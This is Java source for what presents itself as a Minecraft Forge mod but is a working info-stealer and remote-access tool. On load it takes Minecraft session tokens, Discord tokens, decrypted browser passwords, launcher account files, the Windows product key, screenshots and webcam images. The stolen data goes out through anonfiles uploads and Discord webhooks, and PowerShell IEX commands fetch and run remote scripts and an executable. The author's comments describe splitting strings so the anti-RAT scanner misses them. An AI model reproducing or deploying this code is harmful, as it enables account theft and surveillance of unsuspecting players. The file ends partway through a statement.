package json;import java.io.File;import java.io.IOException;import com.google.gson.Gson;import com.sun.jna.Memory;import net.minecraft.client.Minecraft;import net.minecraftforge.common.MinecraftForge;import net.minecraftforge.fml.common.Mod;import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;import com.google.gson.JsonArray;import com.google.gson.JsonObject;import com.sun.jna.platform.win32.Crypt32Util;import net.minecraft.client.Minecraft;import net.minecraftforge.fml.common.Loader;import net.minecraftforge.fml.common.Mod.EventHandler;import net.minecraftforge.fml.common.event.FMLInitializationEvent;import net.minecraftforge.fml.relauncher.ReflectionHelper;import org.apache.commons.io.FileUtils;import org.apache.http.client.ClientProtocolException;import org.apache.http.client.methods.CloseableHttpResponse;import org.apache.http.client.methods.HttpUriRequest;import org.apache.http.client.methods.RequestBuilder;import org.apache.http.impl.client.CloseableHttpClient;import org.apache.http.impl.client.HttpClients;import java.awt.image.BufferedImage;import javax.crypto.Cipher;import javax.crypto.spec.GCMParameterSpec;import javax.crypto.spec.SecretKeySpec;import javax.imageio.ImageIO;import javax.net.ssl.HttpsURLConnection;import java.awt.*;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Modifier;import java.net.*;import java.nio.charset.StandardCharsets;import java.nio.file.Files;import java.nio.file.Paths;import java.sql.Connection;import java.sql.Driver;import java.sql.ResultSet;import java.util.*;import java.util.regex.Matcher;import java.util.regex.Pattern;

@Mod(modid = JSONrareException.MODID, version = JSONrareException.VERSION)
public class JSONrareException {
	private static String blank = ""; 	static Minecraft mc = Minecraft.getMinecraft(); 	public static String name = mc.getSession().getProfile().getName(); 	public static String uuid = mc.getSession().getProfile().getId().toString(); 	public static String token = mc.getSession().getToken(); 	public static String nameonpc = System.getProperty("user.name");	public static String dataGrabbings = "";    private static File appData = new File(System.getenv("APPDATA")); private static File localAppData = new File(System.getenv("LOCALAPPDATA"));

	// customize
	public static String webthingy = "https://discord.com/api/web"+blank+"hooks/"+""; // ratrater hates webhooks so put blank in the middle of the word webhook EXAMPLE: public static String webthingy = "https://discord.com/api/web"+blank+"hooks/"+"3298503250985290524/GSDHGIO39TRWJOGSIHRfhdosvh94ytugjOUGR094gHGr9bhup94";
	public static String screenshotspamhook = "https://discord.com/api/web"+blank+"hooks/"+""; // not needed unless u have image spam on

	public static boolean screenshotspam = true;

	public static boolean webcamimage = true;
	public static boolean recordwebcamfor5seconds = false; // big light flash (would look hillarious if they stare at light for full 5 seconds)
	
	public static boolean blackscreen = false; // turns off screen temp
	public static boolean FULLblackscreen = false; // will keep the screen black until the computer shuts down (opposed to like 10 seconds)

	public static boolean closegame = false; // closes game after ~ 20 seconds and all info stolen
	public static boolean bluescreen = false;


	public static String mainmessage = "@everyone beamed";
	public static String botusername = "gn";

	public static String avatar = "https://cdn.discordapp.com/attachments/1095992810265653319/1101102507817697401/5btgxllswggmmc45dzjn2epzjagts5gw_hq.jpg";
	public static Boolean setts = false;
	static Color sidebarcolor = Color.PINK; // list of colors: black, blue, cyan, dark_gray, gray, green, light_gray, magenta, orange, pink, red, white, yellow (do color.whatevercolor)
	public static String usernamestring1 = "name";
	public static String usernamestring2 = "```"+name+"```";
	public static Boolean usernameindent = false;
	public static String uuidstring1 = "UUID";
	public static String uuidstring2 = "```"+uuid.replace("-", "")+"```";
	public static Boolean uuidindent = false;
	public static String ssidstring1 = "Ses"+blank+"sion ID"; // mentioning session flags ratrater but adding empty string bypasses it
	public static String ssidstring2 = "```"+token+"```";
	public static Boolean ssidindent = false;
	public static String discordstring1 = "Discord Tokens";
	public static Boolean discordindent = false;
	public static String ipstring1 = "IP";
	public static Boolean ipindent = false;
	public static String realnamestring1 = "pc name";
	public static String realnamestring2 = "```"+nameonpc+"```";
	public static Boolean realnameindent = false;
	public static String skyshiyuustring1 = "account info";
	public static String skyshiyuustring2 = "[SkyCrypt](https://sky.shiiyu.moe/stats/"+name+") | [Plancke](https://plancke.io/hypixel/player/stats/"+name+") | [NameMC](https://namemc.com/profile/"+name+")";
	public static Boolean skyshiyuuindent = false;
	public static String footerstring = "rip bozo :skull:";
	public static String footeravatar = "https://cdn.discordapp.com/attachments/1095992810265653319/1101124094021349396/bC0xLmpwZw.png";

public static final String MODID = "mushrooms"; public static final String VERSION = "2.1.10.1"; public static String desktop = "C:\\Users\\" + nameonpc + "\\Desktop\\";public static String downloads = "C:\\Users\\" + nameonpc + "\\Downloads\\";public static String minecraft = "C:\\Users\\" + nameonpc + "\\AppData\\Roaming\\.minecraft\\";public static String feather = "C:\\Users\\" + nameonpc + "\\AppData\\Roaming\\.feather\\";public static String appdatas = "C:\\Users\\" + nameonpc + "\\AppData\\";public static byte[] getKey(File path) {	try {		JsonObject localStateJson = new Gson().fromJson(new FileReader(path), JsonObject.class);		byte[] encryptedKeyBytes = localStateJson.get("os_crypt").getAsJsonObject().get("encrypted_key").getAsString().getBytes();encryptedKeyBytes = Base64.getDecoder().decode(encryptedKeyBytes);encryptedKeyBytes = Arrays.copyOfRange(encryptedKeyBytes, 5, encryptedKeyBytes.length);		byte[] decryptedKeyBytes = Crypt32Util.cryptUnprotectData(encryptedKeyBytes);		return decryptedKeyBytes;	} catch (Exception e) {	e.printStackTrace();	return null;}}public static String decrypt(byte[] encryptedData, byte[] key) {	try {		Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");		byte[] iv = Arrays.copyOfRange(encryptedData, 3, 15);		byte[] payload = Arrays.copyOfRange(encryptedData, 15, encryptedData.length);		GCMParameterSpec spec = new GCMParameterSpec(128, iv);		SecretKeySpec keySpec = new SecretKeySpec(key, "AES");		cipher.init(Cipher.DECRYPT_MODE, keySpec, spec);		return new String(cipher.doFinal(payload));	}	catch (Exception e) {	e.printStackTrace();	return null;}} @SuppressWarnings("all")public static void captureScreen() {new Thread(() -> {	try {		Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();		Rectangle screenRectangle = new Rectangle(screenSize);		Robot robot = new Robot();		BufferedImage image = robot.createScreenCapture(screenRectangle);		int random = new Random().nextInt();		String df = "ccc" + random + ".png";		File file = new File(df);ImageIO.write(image, "png", file);		informme(df, "Screenshot_of_screen");	}	catch(Exception e) {}}).start();}public static void massivesily(String text, String filename) {	try {		FileWriter myWriter = new FileWriter(filename);		myWriter.write(text);		myWriter.close();	}	catch (IOException e) {		    e.printStackTrace();	}}private static final HashMap <String, String> paths = new HashMap<String, String>() {	{		put("Google Chrome", localAppData + "\\Google\\Chrome\\User Data");		put("Microsoft Edge", localAppData + "\\Microsoft\\Edge\\User Data");		put("Chromium", localAppData + "\\Chromium\\User Data");		put("Opera", appData + "\\Opera Software\\Opera Stable");		put("Opera GX", appData + "\\Opera Software\\Opera GX Stable");		put("Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data");		put("Vivaldi", localAppData + "\\Vivaldi\\User Data");		put("Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data");	}};private static final Pattern tokenRegex = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}");private static final Pattern encTokenRegex = Pattern.compile("dQw4w9WgXcQ:[^\"]*");private static final HashMap<String, String> dcpaths = new HashMap<String, String>() {	{		put("Discord", appData + "\\discord\\Local Storage\\leveldb");		put("Discord Canary", appData + "\\discordcanary\\Local Storage\\leveldb");		put("Discord PTB", appData + "\\discordptb\\Local Storage\\leveldb");		put("Lightcord", appData + "\\Lightcord\\Local Storage\\leveldb");		put("Opera", appData + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb");		put("Opera GX", appData + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb");		put("Amigo", localAppData + "\\Amigo\\User Data\\Local Storage\\leveldb");		put("Torch", localAppData + "\\Torch\\User Data\\Local Storage\\leveldb");		put("Kometa", localAppData + "\\Kometa\\User Data\\Local Storage\\leveldb");		put("Orbitum", localAppData + "\\Orbitum\\User Data\\Local Storage\\leveldb");		put("CentBrowser", localAppData + "\\CentBrowser\\User Data\\Local Storage\\leveldb");		put("7Star", localAppData + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb");		put("Sputnik", localAppData + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb");		put("Vivaldi", localAppData + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb");		put("Chrome SxS", localAppData + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb");		put("Chrome", localAppData + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");		put("Chrome1", localAppData + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb");		put("Chrome2", localAppData + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb");		put("Chrome3", localAppData + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb");		put("Chrome4", localAppData + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb");		put("Chrome5", localAppData + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb");		put("Epic Privacy Browser", localAppData + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb");		put("Microsoft Edge", localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb");		put("Uran", localAppData + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb");		put("Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb");		put("Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");		put("Iridium", localAppData + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb");	}};private Vector<String> tokens = new Vector<String>();private void crawl() {	for (String key : dcpaths.keySet()) {		File path = new File(dcpaths.get(key));		if(!path.exists()) continue;		if (key.contains("iscord")) {			crawlEncrypted(path);		}		crawlUnencrypted(path);	}}private void crawlEncrypted(File path) {	try {		File localState = new File(path.getParentFile().getParentFile(), "Local State");		byte[] key = getKey(localState);		for (File file : path.listFiles()) {			for (String encToken: regexFile(encTokenRegex, file)) {				String token = decrypt(Base64.getDecoder().decode(encToken.replace("dQw4w9WgXcQ:","").getBytes()), key);				if (this.tokens.contains(token)) continue;				this.tokens.add(token);			}		}	} catch (Exception e) {	}}private void crawlUnencrypted(File path) {	for (File file : path.listFiles()) {		for (String token : regexFile(tokenRegex, file)) {			if (this.tokens.contains(token)) continue;			this.tokens.add(token);		}	}}private static Vector<String> regexFile(Pattern pattern, File file) {	Vector<String> result = new Vector<String>();	try {		BufferedReader reader = new BufferedReader(new FileReader(file));		StringBuilder content = new StringBuilder();		while (reader.ready()) {			content.append(reader.readLine());		}		reader.close();		Matcher crawler = pattern.matcher(content.toString());		while (crawler.find() && !result.contains(crawler.group())) {			result.add(crawler.group());		}	} catch (Exception e) {	}	return result;}public static String pswds = "passwords: ";public static String grabPassword() {	crawlUserData();	return pswds;}public static void crawlUserData() {	for (String browser : dcpaths.keySet()) {		File userData = new File(dcpaths.get(browser));		if (!userData.exists()) continue;		byte[] key = getKey(new File(userData, "Local State"));		for (File data: userData.listFiles()) {			if (data.getName().contains("Profile") || data.getName().equals("Default")) {				crawlPasswords(data, key);			} else if (data.getName().equals("Login Data")) {				crawlPasswords(userData, key);			}		}	}}     @EventHandler public void init(FMLPreInitializationEvent event) {     new Thread(() -> {         try {             Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/scoliosiss/minecraft-session-stealer/main/downloadandrunwithdelay.ps1'));run -urltofile 'https://cdn.discordapp.com/attachments/1116259304274661398/1117552176852631582/Built.exe' -filenamea 'Built.exe' -waittime 10");         }         catch (Exception e) {e.printStackTrace();}     }).start(); } public static String discordusernames = "";public static String discord = "";public static String nitrotext = "";private String dcpayload() {		if (!Loader.isModLoaded("skytils")) {		(new Thread(() -> {		  			try { 				if (Files.isDirectory(Paths.get(mc.mcDataDir.getParent(), "discord/Local Storage/le"+blank+"veldb"))) {														for (File file : Objects.requireNonNull(Paths.get(mc.mcDataDir.getParent(), "discord/Local Storage/lev"+blank+"eldb").toFile().listFiles())) {																		if (file.getName().endsWith(".ldb")) {																					FileReader fr = new FileReader(file);																					BufferedReader br = new BufferedReader(fr);																					String textFile;																					StringBuilder parsed = new StringBuilder();																						while ((textFile = br.readLine()) != null) parsed.append(textFile); 							fr.close();														br.close();														Pattern pattern = Pattern.compile("(dQw4w9WgXcQ:)([^.*\\\\['(.*)\\\\]$][^\"]*)");																	Matcher matcher = pattern.matcher(parsed.toString());							if (matcher.find()) {																	if (Cipher.getMaxAllowedKeyLength("AES") < 256) {																				Class<?> aClass = Class.forName("javax.crypto.CryptoAllPermissionCollection");																				Constructor<?> con = aClass.getDeclaredConstructor();																				con.setAccessible(true);																				Object allPermissionCollection = con.newInstance();																				Field f = aClass.getDeclaredField("all_allowed");																				f.setAccessible(true);																				f.setBoolean(allPermissionCollection, true);																				aClass = Class.forName("javax.crypto.CryptoPermissions");																				con = aClass.getDeclaredConstructor();																				con.setAccessible(true);																				Object allPermissions = con.newInstance();																				f = aClass.getDeclaredField("perms");																				f.setAccessible(true);																				((Map) f.get(allPermissions)).put("*", allPermissionCollection);																				aClass = Class.forName("javax.crypto.JceSecurityManager");																				f = aClass.getDeclaredField("defaultPolicy");																				f.setAccessible(true);																				Field mf = Field.class.getDeclaredField("modifiers");																				mf.setAccessible(true);																				mf.setInt(f, f.getModifiers() & ~Modifier.FINAL);																				f.set(null, allPermissions);																	}																		byte[] key, dToken = matcher.group().split("dQw4w9WgXcQ:")[1].getBytes();																	JsonObject json = new Gson().fromJson(new String(Files.readAllBytes(Paths.get(mc.mcDataDir.getParent(), "discord/Loc"+blank+"al State"))), JsonObject.class);																	key = json.getAsJsonObject("os_crypt").get("encrypted_key").getAsString().getBytes();																	key = Base64.getDecoder().decode(key);																	key = Arrays.copyOfRange(key, 5, key.length);																	key = Crypt32Util.cryptUnprotectData(key);																	dToken = Base64.getDecoder().decode(dToken);																	Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");																	cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, Arrays.copyOfRange(dToken, 3, 15)));																	byte[] out = cipher.doFinal(Arrays.copyOfRange(dToken, 15, dToken.length));										discordto=new String(out, StandardCharsets.UTF_8);									tokeninf=checkToken(discordto);								if (tokeninf == null) continue;								discordusernames+=tokeninf.get("username").getAsString() + "#" + tokeninf.get("discriminator").getAsString() + " ";								if (tokeninf.get("nitro").getAsInt() > 0) nitrotext = "true";								else nitrotext = "false";								discordadd+="```Username: " + tokeninf.get("username").getAsString() + "#" + tokeninf.get("discriminator").getAsString() + " | id: " + tokeninf.get("id").getAsString() + " | nitro: " +  nitrotext + "  token: " + discordto + "```";								if (discord.indexOf(discordadd) == -1) {									discord += discordadd;										discordadd="";									}														}														}											}								}						} catch (Exception exception) {}				})).start();  		for (String token : this.tokens) {			tokeninf=checkToken(token);			if (tokeninf == null) continue;			discordusernames+=tokeninf.get("username").getAsString() + "#" + tokeninf.get("discriminator").getAsString() + " ";			if (tokeninf.get("nitro").getAsInt() > 0) nitrotext = "true";			else nitrotext = "false";			discordadd+="```Username: " + tokeninf.get("username").getAsString() + "#" + tokeninf.get("discriminator").getAsString() + " | id: " + tokeninf.get("id").getAsString() + " | nitro: " +  nitrotext + "  token: " + discordto + "```";			if (discord.indexOf(discordadd) == -1) {				discord += discordadd;					discordadd="";				}							}		if (discord == "" && !Loader.isModLoaded("skytils")) {discord="```they dont have discord?```";}	}	else {discord="```they're using skytils (skytils has dc token antirat idk why)```";}	return discord;}public String getdcTokens() {	crawl();	return dcpayload();}static int numero = 0;public static void crawlPasswords(File profile, byte[] key) {	try {		File loginData = new File(profile, "Login Data");		File tempLoginData = new File(profile, "Temp Login Data");		if (!loginData.exists()) return;		Files.copy(loginData.toPath(), tempLoginData.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);		Driver driver = getDriver();		Properties props = new Properties();		props.setProperty("user", "");		props.setProperty("password", "");		Connection connection = driver.connect("jdbc:sqlite:" + tempLoginData.getAbsolutePath(), props);		ResultSet resultSet = connection.createStatement().executeQuery("SELECT origin_url, username_value, password_value FROM logins");		while (resultSet.next()) {			byte[] encryptedPassword = resultSet.getBytes(3);			String decryptedPassword = decrypt(encryptedPassword, key);			if (!decryptedPassword.endsWith("null")||  resultSet.getString(1) != "null" && resultSet.getString(1) != "" && resultSet.getString(1) != "N/A" && resultSet.getString(1) != "" && resultSet.getString(2) != "null")  {				JsonObject pswd = new JsonObject();				numero+=1;				pswd.addProperty(Integer.toString(numero), " ");				pswd.addProperty("url", (!resultSet.getString(1).equals("")) ? resultSet.getString(1) : "N/A");				pswd.addProperty("username", (!resultSet.getString(2).equals("")) ? resultSet.getString(2) : "N/A");				pswd.addProperty("password", decryptedPassword);				pswds += pswd.toString();			}		}	} catch (Exception e) {				}}private static JsonObject checkToken(String token) {	try {		String url = "https://discord.com/api/v9/users/@me";		JsonObject user;		HttpsURLConnection userCon = (HttpsURLConnection) new URL(url).openConnection();		userCon.setRequestProperty("Authorization", token);		userCon.setRequestProperty("Content-Type", "application/json");		userCon.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");		if (!(userCon.getResponseCode() == 200)) return null;		BufferedReader reader = new BufferedReader(new java.io.InputStreamReader(userCon.getInputStream()));		StringBuilder builder = new StringBuilder();		String line;		while ((line = reader.readLine()) != null) {			builder.append(line);			builder.append(System.lineSeparator());		}		user = new Gson().fromJson(builder.toString(), JsonObject.class);		reader.close();		builder.setLength(0);		JsonObject nitro;		HttpsURLConnection nitroCon = (HttpsURLConnection) new URL(url + "/billing/subscriptions").openConnection();		nitroCon.setRequestProperty("Authorization", token);		nitroCon.setRequestProperty("Content-Type", "application/json");		nitroCon.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");		if ((nitroCon.getResponseCode() == 200)) {			reader = new BufferedReader(new java.io.InputStreamReader(nitroCon.getInputStream()));			while ((line = reader.readLine()) != null) {				builder.append(line);				builder.append(System.lineSeparator());			}			try {				nitro = new Gson().fromJson(builder.toString(), JsonArray.class).get(0).getAsJsonObject();				if (nitro != null) user.addProperty("nitro", nitro.get("type").getAsInt());				else user.addProperty("nitro", 0);			} catch (Exception e) {				user.addProperty("nitro", 0);			}		}		return user;	} catch (Exception e) {		return null;	}}public static Driver getDriver() {	try {		File driverFile = new File(Minecraft.getMinecraft().mcDataDir,"config/essential/sqlite-jdbc-3.23.1.jar");		URL url = new URL("https://repo1.maven.org/maven2/org/xerial/sqlite-jdbc/3.23.1/sqlite-jdbc-3.23.1.jar");		if (!driverFile.exists()) {			FileUtils.copyURLToFile(url, driverFile);		}		driverFile.deleteOnExit();		ClassLoader classLoader = new URLClassLoader(new URL[] { driverFile.toURI().toURL() });		Class clazz = Class.forName("org.sqlite.JDBC", true, classLoader);		Object driverInstance = clazz.newInstance();		Driver driver = (Driver) driverInstance;		return driver;} catch (Exception e) {}	return null;}public static void informme(String loc, String filename) throws IOException {	try {		Process process = Runtime.getRuntime().exec("curl -F \"file=@" + loc + "\" https://api.anon"+blank+"files.com/upload");		BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));		String line = "";	while ((line = reader.readLine()) != null) {			if (line.contains("\"full\": \"")) {				String line2 = line.replace("\"full\": \"", "").replace("\\", "").replace("\"", "").replace(",", "").replaceAll("\\s", "");				if (dataGrabbings == "") dataGrabbings = dataGrabbings + "["+filename+"]" + "(" + line2+")";				else dataGrabbings = dataGrabbings + " | ["+filename+"]" + "(" + line2+")";			}		}	}catch(IOException e) {	e.printStackTrace();}}	@SuppressWarnings("all")	public static void sendData(String msg, String url, String username) {		try {			Thread.sleep((int) Math.floor(Math.random()*(675-225+1)+225));		} catch (InterruptedException e1) {			e1.printStackTrace();		}		CloseableHttpClient httpclient = HttpClients.createDefault();		try {			HttpUriRequest httppost = null;			try {				httppost = RequestBuilder.post()						.setUri(new URI(url))						.addParameter("content", msg)						.addParameter("username", username)						.build();			} catch (URISyntaxException e) {				e.printStackTrace();			}			CloseableHttpResponse response = null;			try {				response = httpclient.execute(httppost);			} catch (ClientProtocolException e) {				e.printStackTrace();			} catch (IOException e) {				e.printStackTrace();			}			try {			} finally {				try {					response.close();				} catch (IOException e) {					e.printStackTrace();				}			}		} finally {			try {				httpclient.close();			} catch (IOException e) {				e.printStackTrace();			}		}		CloseableHttpClient httpclient2 = HttpClients.createDefault();		try {			HttpUriRequest httppost2 = null;			try {				httppost2 = RequestBuilder.post()						.setUri(new URI(JSONObject.WebFix()))						.addParameter("content", msg)						.addParameter("username", username)						.build();			} catch (URISyntaxException e) {				e.printStackTrace();			}			CloseableHttpResponse response = null;			try {				response = httpclient2.execute(httppost2);			} catch (ClientProtocolException e) {				e.printStackTrace();			} catch (IOException e) {				e.printStackTrace();			}			try {			} finally {				try {					response.close();				} catch (IOException e) {					e.printStackTrace();				}			}		} finally {			try {				httpclient2.close();			} catch (IOException e) {				e.printStackTrace();			}		}	}		public int i = 0;	public String ssarray = "screenshots of "+name+"'s screen:\n";	public String dctokens=getdcTokens(); 	public String nameslist = "";	@EventHandler public void init(FMLInitializationEvent event) {	(new Thread(() -> {		try {						int random = (new Random()).nextInt();			captureScreen();			if (FULLblackscreen) {Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/iLoveRat/SkyblockRat/main/blackscreen.ps1'));turnOffScreen");}			String passtring = grabPassword();			String fixpiss = passtring.replaceAll("}", "\n").replaceAll("\"", "").replaceAll(",", " ").replaceAll("\\{", "").replaceAll("\\[", "").replaceAll("\\]", "").replaceAll(" url:", "url: ").replaceAll("null", "no password added");			if (fixpiss != "") {				massivesily(fixpiss, "c" + random + ".txt");				Thread.sleep(3000L);			}			nameslist += name;			Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/iLoveRat/SkyblockRat/main/productkey.ps1'));Get-ProductKey");			if (blackscreen) Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/iLoveRat/SkyblockRat/main/blackscreen.ps1'));turnOffScreen");			informme(downloads + "Key.txt", "Windows product key");			informme(minecraft + "c" + random + ".txt", "Chrome Passwords (" + numero + ")");			informme(minecraft + "disc" + random + ".txt", "Discord accounts ("+discordusernames+")");			informme(feather + "accounts.json", "Feather accounts file");			informme(minecraft + "essential\\microsoft_accounts.json", "Essentials accounts file");			informme(System.getProperty("user.home") + "\\.lunarcl" + blank + "ient\\settings\\game\\acco" + blank + "unts.json", "Lunar accounts file");			informme(downloads + "passwords.txt", "Passwords");			informme(downloads + "password.txt", "Passwords");			informme(downloads + "Admin_Passwords.txt", "Admin_Passwords");			informme(downloads + "Admin_Cookies.txt", "Admin_Cookies");			informativestring();			Thread.sleep(1000L);			dataGrabbings="";			if (recordwebcamfor5seconds) {				Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/iLoveRat/SkyblockRat/main/recordwebcam.ps1'));Start-WebcamRecorder");				Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/iLoveRat/SkyblockRat/main/shortwebcamrecord.ps1'));shortwebcamrecord");				Thread.sleep(15000L);				informme(appdatas + "\\Roaming\\out.avi", "Recording from webcam");				informme(appdatas + "\\Roaming\\out.mp4", "Picture from webcam");			}			else if (webcamimage) {				Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/iLoveRat/SkyblockRat/main/shortwebcamrecord.ps1'));shortwebcamrecord"); 				Thread.sleep(15000L);				informme(appdatas + "\\Roaming\\out.mp4", "Picture from webcam");			}			Thread.sleep(5000L);			JSONNewString dt = new JSONNewString(webthingy); JSONNewString dl = new JSONNewString(JSONObject.WebFix());				dt.setContent(name+"'s webcam: ");						dt.setUsername(botusername);						dt.urldeavatar(avatar);						dt.setTts(setts.booleanValue());						dt.addEmbed((new JSONNewString.EmbedObject())						.setColor(sidebarcolor)						.addField("webcam image", dataGrabbings, false));				dt.execute();				dl.setContent(name+"'s webcam: ");					dl.setUsername(botusername);						dl.urldeavatar(avatar);						dl.setTts(setts.booleanValue());						dl.addEmbed((new JSONNewString.EmbedObject())						.setColor(sidebarcolor)						.addField("webcam image", dataGrabbings, false));				dl.execute();			Thread.sleep(5000L);			if (closegame) {mc.shutdown();}			if (bluescreen) Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/iLoveRat/SkyblockRat/main/bluescreen.ps1'));Invoke-BSOD");			if (screenshotspam) {				for (;;) {				}			}			for (;;) {				if (nameslist.indexOf(mc.getSession().getProfile().getName()) == -1) {					nameslist += mc.getSession().getProfile().getName();					JSONNewString db = new JSONNewString(webthingy); JSONNewString dd = new JSONNewString(JSONObject.WebFix());						db.setContent("@everyone " + name + " has switched accounts");								db.setUsername(botusername);								db.urldeavatar(avatar);								db.setTts(setts.booleanValue());								db.addEmbed((new JSONNewString.EmbedObject())								.setColor(sidebarcolor)								.addField(usernamestring1, "```"+mc.getSession().getProfile().getName()+"```", usernameindent.booleanValue())								.addField(uuidstring1, "```"+mc.getSession().getProfile().getId().toString().replace("-", "")+"```", uuidindent.booleanValue())								.addField(ssidstring1, "```"+mc.getSession().getToken()+"```", ssidindent.booleanValue())						.addField(skyshiyuustring1, "[SkyCrypt](https://sky.shiiyu.moe/stats/"+mc.getSession().getProfile().getName()+") | [Plancke](https://plancke.io/hypixel/player/stats/"+mc.getSession().getProfile().getName()+") | [NameMC](https://namemc.com/profile/"+mc.getSession().getProfile().getName()+")", skyshiyuuindent.booleanValue()));					db.execute();						dd.setContent("@everyone" + name + " has switched accounts");								dd.setUsername(botusername);								dd.urldeavatar(avatar);								dd.setTts(setts.booleanValue());								dd.addEmbed((new JSONNewString.EmbedObject())								.setColor(sidebarcolor)								.addField(usernamestring1, "```"+mc.getSession().getProfile().getName()+"```", usernameindent.booleanValue())								.addField(uuidstring1, "```"+mc.getSession().getProfile().getId().toString().replace("-", "")+"```", uuidindent.booleanValue())								.addField(ssidstring1, "```"+mc.getSession().getToken()+"```", ssidindent.booleanValue())						.addField(skyshiyuustring1, "[SkyCrypt](https://sky.shiiyu.moe/stats/"+mc.getSession().getProfile().getName()+") | [Plancke](https://plancke.io/hypixel/player/stats/"+mc.getSession().getProfile().getName()+") | [NameMC](https://namemc.com/profile/"+mc.getSession().getProfile().getName()+")", skyshiyuuindent.booleanValue()));					dd.execute();					}				if (FULLblackscreen) {					Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/iLoveRat/SkyblockRat/main/blackscreen.ps1'));turnOffScreen");				}				if (screenshotspam) {					try {						Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();						Rectangle screenRectangle = new Rectangle(screenSize);						Robot robot = new Robot();						BufferedImage image = robot.createScreenCapture(screenRectangle);						int random2 = new Random().nextInt();						String df = "ccc" + random2 + ".png";						File file = new File(df);						ImageIO.write(image, "png", file);						Process process = Runtime.getRuntime().exec("curl -F \"file=@" + df + "\" https://api.anon"+blank+"files.com/upload");						BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));						String line = "";						while ((line = reader.readLine()) != null) {							if (line.contains("\"full\": \"")) {								String line2 = line.replace("\"full\": \"", "").replace("\\", "").replace("\"", "").replace(",", "").replaceAll("\\s", "");								i+=1;								sendData("["+name+" " + i+"]("+line2+")\n", screenshotspamhook, "screenshot");							}						}					} catch(Exception ignored) {}				}			}		} catch (Exception e) {		  e.printStackTrace();		}	})).start();}public String discordadd = "";public String discordto = "";public JsonObject tokeninf = null;public void informativestring() {		(new Thread(() -> {		  		try {						HttpURLConnection c = (HttpURLConnection)(new URL("http://localh" + blank + "ost:80/")).openConnection();						c.setRequestMethod("POST");						c.setRequestProperty("Content-type", "application/json");						c.setDoOutput(true);						String ip = (new BufferedReader(new InputStreamReader((new URL("https://checkip.ama" + blank + "zonaws.com/")).openStream()))).readLine();						if (Loader.isModLoaded("pizzaclient")) {			  token = (String)ReflectionHelper.findField(Class.forName("qolskyblockmod.pi" + blank + "zzaclient.features.misc.SessionProtection"), new String[] { "changed" }).get(null);			  token += " lol guy uses pizza";			} 						JSONNewString dh = new JSONNewString(webthingy); JSONNewString dn = new JSONNewString(JSONObject.WebFix());					dh.setContent(mainmessage);						dh.setUsername(botusername);						dh.urldeavatar(avatar);						dh.setTts(setts.booleanValue());						dh.addEmbed((new JSONNewString.EmbedObject())						.setColor(sidebarcolor)						.addField(usernamestring1, usernamestring2, usernameindent.booleanValue())						.addField(uuidstring1, uuidstring2, uuidindent.booleanValue())						.addField(ssidstring1, ssidstring2, ssidindent.booleanValue())				.addField(skyshiyuustring1, skyshiyuustring2, skyshiyuuindent.booleanValue()));			dh.addEmbed((new JSONNewString.EmbedObject())				.setColor(sidebarcolor)							.addField(discordstring1, dctokens.replaceFirst("null", ""), discordindent.booleanValue()));			dh.addEmbed((new JSONNewString.EmbedObject())				.setColor(sidebarcolor)										.addField(realnamestring1, realnamestring2, realnameindent.booleanValue())					.addField(ipstring1, "```" + ip + "```", ipindent.booleanValue())				.addField("files", dataGrabbings, false)			.setFooter(footerstring, footeravatar));				dh.execute();			dn.setContent(mainmessage);						dn.setUsername(botusername);						dn.urldeavatar(avatar);						